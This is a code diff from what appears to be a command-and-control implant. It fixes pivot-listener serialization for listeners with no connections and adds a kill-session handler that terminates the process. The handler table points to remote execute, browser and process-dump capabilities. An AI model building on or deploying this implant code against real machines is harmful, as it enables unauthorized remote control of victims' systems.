@@ -3655,19 +3655,22 @@ PENVELOPE PivotListenersHandler
 		PivotListener[0] = CreateVarIntElement(pListener->dwListenerId, 1);
 		PivotListener[1] = CreateVarIntElement(pListener->dwType, 2);
 		PivotListener[2] = CreateBytesElement(pListener->lpBindAddress, lstrlenA(pListener->lpBindAddress), 3);
-		ConnectionList = ALLOC(pListener->dwNumberOfConnections * sizeof(PPBElement));
-		for (j = 0; j < pListener->dwNumberOfConnections; j++) {
-			pConnection = pListener->Connections[j];
-			SecureZeroMemory(NetConnPivot, sizeof(NetConnPivot));
-			NetConnPivot[0] = CreateVarIntElement(pConnection->uDownstreamPeerID, 1);
-			if (pConnection->lpRemoteAddress != NULL) {
-				NetConnPivot[1] = CreateBytesElement(pConnection->lpRemoteAddress, lstrlenA(pConnection->lpRemoteAddress), 2);
+		if (pListener->dwNumberOfConnections > 0) {
+			ConnectionList = ALLOC(pListener->dwNumberOfConnections * sizeof(PPBElement));
+			for (j = 0; j < pListener->dwNumberOfConnections; j++) {
+				pConnection = pListener->Connections[j];
+				SecureZeroMemory(NetConnPivot, sizeof(NetConnPivot));
+				NetConnPivot[0] = CreateVarIntElement(pConnection->uDownstreamPeerID, 1);
+				if (pConnection->lpRemoteAddress != NULL) {
+					NetConnPivot[1] = CreateBytesElement(pConnection->lpRemoteAddress, lstrlenA(pConnection->lpRemoteAddress), 2);
+				}
+
+				ConnectionList[j] = CreateStructElement(NetConnPivot, _countof(NetConnPivot), 0);
 			}
 
-			ConnectionList[j] = CreateStructElement(NetConnPivot, _countof(NetConnPivot), 0);
+			PivotListener[3] = CreateRepeatedStructElement(ConnectionList, pListener->dwNumberOfConnections, 4);
 		}
-
-		PivotListener[3] = CreateRepeatedStructElement(ConnectionList, pListener->dwNumberOfConnections, 4);
+		
 		ListenerList[dwIdx++] = CreateStructElement(PivotListener, _countof(PivotListener), 0);
 		FREE(ConnectionList);
 		LeaveCriticalSection(&pListener->Lock);
@@ -3686,6 +3689,14 @@ CLEANUP:
 	FREE(ListenerList);
 
 	return pRespEnvelope;
+}
+
+PENVELOPE KillHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	ExitProcess(0);
 }
 
 REQUEST_HANDLER* GetSystemHandler()
@@ -3721,6 +3732,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgMkdirReq] = MkdirHandler;
 	HandlerList[MsgExecuteReq] = ExecuteHandler;
 	HandlerList[MsgBrowserReq] = BrowserHandler;
+	HandlerList[MsgKillSessionReq] = KillHandler;
 	
 	HandlerList[MsgTaskReq] = NULL;
 	HandlerList[MsgProcessDumpReq] = NULL;
